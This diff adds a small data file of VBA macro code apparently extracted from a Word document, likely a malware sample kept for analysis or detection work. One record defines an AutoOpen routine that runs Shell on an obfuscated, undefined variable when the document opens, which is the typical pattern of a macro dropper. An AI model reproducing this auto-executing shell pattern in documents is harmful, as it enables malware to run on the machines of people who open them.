@@ -1,0 +1,2 @@
+[{\'code\': \'Attribute VB_Name = "ThisDocument"\\r\\nAttribute VB_Base = "1Normal.ThisDocument"\\r\\nAttribute VB_GlobalNameSpace = False\\r\\nAttribute VB_Creatable = False\\r\\nAttribute VB_PredeclaredId = True\\r\\nAttribute VB_Exposed = True\\r\\nAttribute VB_TemplateDerived = True\\r\\nAttribute VB_Customizable = True\\r\\n\'}\n
+ {\'code\': \'Attribute VB_Name = "NewMacros"\\r\\n\\r\\n\\r\\nSub AutoOpen()\\r\\nShell (KeWJutaARj)\\r\\nEnd Sub\\r\\n\\r\\n\\r\\n\'}]
